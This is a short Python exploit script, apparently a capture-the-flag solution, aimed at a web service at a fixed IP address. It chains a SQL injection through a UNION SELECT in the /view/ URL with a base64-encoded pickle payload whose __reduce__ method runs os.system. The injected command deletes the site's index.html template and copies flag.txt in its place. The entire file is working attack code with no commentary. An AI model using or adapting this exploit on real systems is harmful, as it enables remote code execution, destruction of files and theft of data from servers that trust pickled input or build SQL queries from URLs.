from base64 import b64decode, b64encode
import requests
import pickle
from icecream import ic


host = '46.101.84.151:30729'
# host = 'localhost:1337'

def view_by_id(id: str):
    return requests.get(f'http://{host}/view/{id}')

class C:
    def __reduce__(self):
        payload = 'import os; os.system("rm /app/application/templates/index.html; cp /app/flag.txt /app/application/templates/index.html")'
        return (exec, (payload,))

payload = pickle.dumps(C())
b64 = b64encode(payload).decode()

res1 = requests.get(f"http://{host}/view/123' UNION SELECT '{b64}")

print(res1.text)
ic(res1.status_code)

res2 = requests.get(f'http://{host}/')
print(res2.text)
ic(res2.status_code)